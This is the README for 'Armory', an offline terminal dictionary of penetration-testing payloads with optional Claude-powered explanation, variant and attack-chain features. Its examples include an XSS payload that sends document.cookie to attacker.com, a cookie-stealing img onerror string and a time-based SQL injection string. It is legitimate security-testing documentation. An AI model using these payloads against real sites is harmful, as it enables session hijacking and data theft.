# Armory — Interactive Pentest Payload Dictionary & Knowledge Base

A Python CLI application serving as an offline-first, interactive reference dictionary for penetration testers. Navigate a curated, structured knowledge base of offensive security techniques using a rich keyboard-driven TUI built on Textual.

## Features

- **≥ 20 vulnerability classes** with curated attack groups and payloads
- **≥ 300 individual payloads** with prose explanations, WAF bypass notes, and CVE references
- **Rich TUI** (Textual) with keyboard-driven navigation, search overlay, and detail panels
- **CLI commands** for scripting: `search`, `info`, `export`, `add`, `delete`, `import`, `cheatsheet`, `update`, `ai-ask`
- **Claude AI integration** (opt-in; **unverified — needs your own API key, see [AI Features Setup](#ai-features-setup)**): deeper explanations, variant generation, chain suggestions
- **Offline-first**: no telemetry, no background network calls unless you explicitly invoke AI or update features
- **Export formats**: txt, JSON, CSV, Burp Intruder wordlist, ffuf wordlist, Markdown

## Installation

### Prerequisites

- Python 3.11+
- Terminal with 256-color support

### Install

```bash
# Clone the repository
git clone <repo-url>
cd armory

# Quick setup (recommended)
bash init.sh

# Or manual install
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
```

## Quick Start

```bash
# Launch interactive TUI
armory

# Open directly on a vulnerability class
armory --class xss

# Show class overview
armory info xss

# List all 20 vulnerability classes
armory info --list-all

# Fuzzy search payloads
armory search "alert"
armory search "template injection jinja" --format json

# Export payloads for Burp Intruder
armory export --class xss --format burp --output xss_payloads.txt

# Export payloads for ffuf
armory export --class sqli --format ffuf --output sqli_payloads.txt

# Print a compact cheat sheet
armory cheatsheet --class xss
armory cheatsheet --class all > all_cheatsheets.txt

# Add a custom payload
armory add --class xss --group reflected --payload '<svg onload=alert(1)>' --description "SVG onload" --tags "svg,bypass"

# Search for payloads with a specific CVE
armory info --cve CVE-2021-44228
```

## TUI Key Bindings

| Key | Action |
|-----|--------|
| ↑ ↓ / j k | Navigate list items |
| Tab / Shift+Tab | Move focus between panes/sections |
| Enter | Select / drill down |
| Esc | Go back one level |
| q | Quit (from top level) |
| / | Open search overlay |
| ? | Open help modal |
| B | Bookmark current payload |
| N | Open note editor |
| Y | Copy payload to clipboard |
| Ctrl+Y | Copy full detail (title + payload + how-it-works) |
| E | AI: explain this payload deeper |
| V | AI: generate payload variants |
| C | AI: suggest attack chain |
| H | Open history panel |
| T | Open tag cloud |
| G | Jump to selected history entry |

## CLI Commands

### `armory search QUERY`

Fuzzy search across all payload content.

```bash
armory search "sql injection"
armory search "bypass htmlspecialchars" --class xss
armory search "blind xss" --tag blind --format json
armory search "oob" --limit 10
```

### `armory info`

```bash
armory info xss                     # Class overview
armory info --list-all              # All classes table
armory info --cve CVE-2021-44228    # Payloads with this CVE
```

### `armory export`

```bash
armory export --class xss --format burp     # Burp Intruder wordlist
armory export --class sqli --format json    # JSON with full metadata
armory export --class xss --format csv      # CSV spreadsheet
armory export --class all --format json     # All classes as JSON object
armory export --class xss --bookmarks --format json  # Bookmarked only
armory export --class xss --filter-tag blind --format burp
armory export --class xss --min-difficulty expert --format json
armory export --class xss --source custom --format json  # Custom payloads only
```

### `armory add`

```bash
armory add --class xss --group reflected \
  --payload '<svg onload=alert(1)>' \
  --description "SVG onload bypass" \
  --tags "svg,bypass-script-filter"
```

### `armory delete`

```bash
armory delete PAYLOAD_ID              # Delete custom payload by ID
armory delete --group my-group --class xss   # Delete custom group
armory delete --class my-custom-class        # Delete custom class
```

### `armory import`

```bash
armory import --file my_payloads.yaml
armory import --file my_payloads.json --dry-run
armory import --file my_payloads.yaml --overwrite --class xss
```

### `armory cheatsheet`

```bash
armory cheatsheet --class xss
armory cheatsheet --class all --output full_cheatsheet.txt
```

### `armory ai-ask`

```bash
export ARMORY_CLAUDE_API_KEY='your-api-key'
armory ai-ask "What XSS payloads bypass htmlspecialchars ENT_QUOTES?"
armory ai-ask "blind SSRF techniques" --class ssrf
```

## AI Features Setup

> **⚠️ AI features are UNVERIFIED.** Everything in this section requires a real
> `ARMORY_CLAUDE_API_KEY` and live access to `api.anthropic.com`. These features
> were **built but not verified end-to-end** — no API key was available in the
> development/test environment, so the actual AI responses have not been
> exercised. What *is* verified is the graceful behavior when the key is absent
> (a clear "AI unavailable" notice, no crash). **Try the AI features with your
> own key before relying on them.**

Armory's AI features use the Anthropic Claude API. They are fully opt-in:

```bash
export ARMORY_CLAUDE_API_KEY='your-anthropic-api-key'
```

Without this key, all AI features display a clear notice and no errors occur. AI features:
- **E key**: "Explain deeper" — step-by-step walkthrough of how the payload works
- **V key**: "Generate variants" — context-aware payload variants (WAF product, encoding, etc.)
- **C key**: "Chain suggestion" — multi-step attack chain from the current payload
- **Ctrl+A in search**: AI-assisted search when regular search returns 0 results
- **armory ai-ask QUESTION**: Direct non-TUI AI query

AI responses are cached locally in SQLite to avoid re-billing repeat queries.

## Custom Payload Guide

### Adding payloads

```bash
# Via CLI (non-interactive)
armory add --class xss --group stored \
  --payload '<img src=x onerror=alert(document.cookie)>' \
  --description "Cookie exfiltration via img onerror" \
  --tags "stored,cookie-theft,onerror"

# Via CLI (opens $EDITOR for description)
armory add --class sqli --group time-based --payload "1' AND SLEEP(5)--" --tags "time-based,blind"
```

### Importing payloads

Accepted formats: YAML (matching bundled class-file schema) or JSON flat array.

JSON format:
```json
[
  {
    "title": "My custom XSS",
    "payload_string": "<svg onload=fetch('https://attacker.com/'+document.cookie)>",
    "class_slug": "xss",
    "group_slug": "stored",
    "how_it_works": "This payload uses the SVG onload event to exfiltrate cookies. The fetch API sends an HTTP request to an attacker-controlled server. This bypasses basic script tag filters.",
    "tags": ["stored", "cookie-exfil", "svg"],
    "waf_bypass_notes": "Bypasses filters blocking <script> tags; may be blocked by Cloudflare unless URL-encoded",
    "cve_refs": []
  }
]
```

### Custom classes and groups

Armory automatically creates custom classes and groups when you `armory add` with a new class/group slug. Custom entries survive `armory update` and are stored separately from the built-in YAML bundle.

## Export Guide

| Format | Use Case | Tool |
|--------|----------|------|
| `burp` | Intruder payload list | Burp Suite → Intruder → Payloads → Simple list |
| `ffuf` | Fuzzing wordlist | `ffuf -w payloads.txt -u https://target/FUZZ` |
| `txt` | Generic wordlist | Any tool accepting a wordlist |
| `json` | Programmatic processing | `jq`, Python scripts, CI pipelines |
| `csv` | Spreadsheet | Excel, Google Sheets, LibreOffice |
| `markdown` | Reference document | Printing, sharing, Obsidian |

## Themes

```bash
armory --theme dark     # Default: dark background
armory --theme light    # Light background
armory --theme hacker   # Neon green on dark (CRT aesthetic)
```

Set `NO_MOTION=1` to disable all animations: `NO_MOTION=1 armory`

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `ARMORY_CLAUDE_API_KEY` | (unset) | Anthropic API key for AI features |
| `ARMORY_DB_PATH` | `~/.armory/armory.db` | Override SQLite database location |
| `NO_MOTION` | (unset) | Set to `1` to disable TUI animations |
| `EDITOR` | `vim` | Editor for long-form how-it-works notes |

## Project Structure

```
armory/
├── pyproject.toml          # Package metadata and dependencies
├── init.sh                 # Environment setup script
├── README.md               # This file
├── armory/
│   ├── __init__.py
│   ├── cli.py              # Click CLI entry point
│   ├── tui/                # Textual TUI application
│   │   ├── app.py
│   │   ├── screens.py
│   │   └── widgets.py
│   ├── data/               # Bundled YAML knowledge base
│   │   ├── xss.yaml
│   │   ├── sqli.yaml
│   │   ├── cmdi.yaml
│   │   └── ... (20 YAML files)
│   ├── db.py               # SQLite data access layer
│   ├── search.py           # rapidfuzz search engine
│   ├── export.py           # Export format handlers
│   └── ai.py               # Claude AI integration
```

## YAML Contribution Guide

To add or improve built-in payloads, edit the appropriate YAML file in `armory/data/`. Follow the schema:

```yaml
slug: xss
name: Cross-Site Scripting (XSS)
owasp: A03:2021 – Injection
description: "2-4 sentence overview"
severity_range: {low: 4.0, high: 9.0}
references:
  - {label: "OWASP XSS", url: "https://owasp.org/www-community/attacks/xss/"}
groups:
  - slug: reflected
    name: Reflected XSS
    description: "..."
    difficulty: low
    prerequisites: ["input reflected in HTML response", "no output encoding"]
    payloads:
      - id: xss-reflected-001
        title: "Basic script tag"
        payload_string: "<script>alert(1)</script>"
        how_it_works: "3-6 sentences explaining the mechanism..."
        prerequisites: ["input in HTML body context", "no CSP"]
        waf_bypass_notes: "Blocked by most WAFs in basic form..."
        severity_context: "CVSS 6.1; reflected XSS can lead to session hijacking..."
        cve_refs: []
        tags: ["basic", "html-body-context"]
```

**Content rules:**
- Payload strings must be from vetted public sources (PayloadsAllTheThings, PortSwigger, HackTricks, etc.)
- CVE IDs must be verifiable via the NVD API — use `cve_refs: []` rather than invented IDs
- `how_it_works` must be ≥ 3 sentences in your own words

